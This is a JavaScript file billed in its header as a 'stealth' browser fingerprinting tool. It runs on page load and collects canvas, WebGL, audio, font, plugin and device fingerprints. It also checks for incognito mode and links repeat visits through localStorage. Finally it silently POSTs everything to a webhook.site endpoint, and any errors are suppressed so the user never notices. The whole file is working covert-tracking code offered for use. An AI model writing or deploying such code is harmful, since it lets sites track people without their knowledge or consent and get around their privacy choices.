// X-Fingerprint: Browser Fingerprinting Tool (Stealth Version)
// Sends fingerprint data silently to server without notifying the user

async function generateSHA256Hash(input) {
  const encoder = new TextEncoder();
  const data = encoder.encode(input);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
}

function canvasFingerprint() {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  canvas.width = 200;
  canvas.height = 50;
  ctx.textBaseline = 'top';
  ctx.font = "16px 'Arial'";
  ctx.fillStyle = '#f60';
  ctx.fillRect(0, 0, 200, 50);
  ctx.fillStyle = '#069';
  ctx.fillText('Canvas Fingerprint Test!', 2, 2);
  return canvas.toDataURL();
}

function getWebGLFingerprint() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  if (!gl) return 'WebGL not supported';
  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
  const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
  const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  return `${vendor}~${renderer}`;
}

async function audioFingerprint() {
  return new Promise((resolve) => {
    const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if (!AudioContext) return resolve('AudioContext not supported');
    const context = new AudioContext(1, 44100, 44100);
    const oscillator = context.createOscillator();
    const compressor = context.createDynamicsCompressor();
    const analyser = context.createAnalyser();
    oscillator.type = 'triangle';
    oscillator.frequency.setValueAtTime(10000, context.currentTime);
    oscillator.connect(compressor);
    compressor.connect(analyser);
    analyser.connect(context.destination);
    oscillator.start(0);
    context.startRendering();
    context.oncomplete = async (event) => {
      const buffer = event.renderedBuffer.getChannelData(0).slice(4500, 5000);
      const hash = await generateSHA256Hash(buffer.join(''));
      resolve(hash);
    };
  });
}

function detectFonts() {
  const baseFonts = ['monospace', 'sans-serif', 'serif'];
  const testFonts = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Trebuchet MS', 'Verdana'];
  const testSize = '72px';
  const span = document.createElement('span');
  span.style.fontSize = testSize;
  span.innerText = 'abcdefghiABCDEFGHI1234567890';
  document.body.appendChild(span);
  const defaultDimensions = {};
  baseFonts.forEach((font) => {
    span.style.fontFamily = font;
    defaultDimensions[font] = { width: span.offsetWidth, height: span.offsetHeight };
  });
  const availableFonts = [];
  testFonts.forEach((font) => {
    span.style.fontFamily = `${font}, monospace`;
    const detected = baseFonts.some(base => {
      return span.offsetWidth !== defaultDimensions[base].width || span.offsetHeight !== defaultDimensions[base].height;
    });
    if (detected) availableFonts.push(font);
  });
  document.body.removeChild(span);
  return availableFonts.join(',');
}

function getBasicEnvFingerprint() {
  return [
    navigator.userAgent,
    navigator.language,
    screen.colorDepth,
    screen.width,
    screen.height,
    new Date().getTimezoneOffset(),
    navigator.platform,
    navigator.hardwareConcurrency,
    navigator.deviceMemory || 'unknown'
  ].join('~');
}

function getPluginsFingerprint() {
  return Array.from(navigator.plugins).map(p => `${p.name}::${p.filename}::${p.description}`).join('|');
}

async function detectIncognito() {
  return new Promise((resolve) => {
    const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
    if (!fs) return resolve(false);
    fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
  });
}

async function generateFingerprint() {
  const canvasData = canvasFingerprint();
  const canvasHash = await generateSHA256Hash(canvasData);
  const webglData = getWebGLFingerprint();
  const webglHash = await generateSHA256Hash(webglData);
  const audioHash = await audioFingerprint();
  const fontData = detectFonts();
  const fontHash = await generateSHA256Hash(fontData);
  const envData = getBasicEnvFingerprint();
  const envHash = await generateSHA256Hash(envData);
  const pluginsData = getPluginsFingerprint();
  const pluginsHash = await generateSHA256Hash(pluginsData);
  const combined = canvasHash + webglHash + audioHash + fontHash + envHash + pluginsHash;
  const finalHash = await generateSHA256Hash(combined);
  return {
    canvasHash,
    webglHash,
    audioHash,
    fontHash,
    envHash,
    pluginsHash,
    combinedFingerprint: finalHash,
    canvasPreview: canvasData.substring(0, 100) + '...'
  };
}

(async () => {
  const fingerprint = await generateFingerprint();
  const currentFingerprint = fingerprint.combinedFingerprint;
  const savedFingerprint = localStorage.getItem('userFingerprint');
  const isIncognito = await detectIncognito();
  localStorage.setItem('userFingerprint', currentFingerprint);
  const payload = {
    fingerprint,
    timestamp: new Date().toISOString(),
    isIncognito,
    sameUser: savedFingerprint === currentFingerprint
  };

  try {
    await fetch('https://webhook.site/22ca7da1-0bae-4b86-beff-265e448c35f4', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    // Fail silently
  }
})();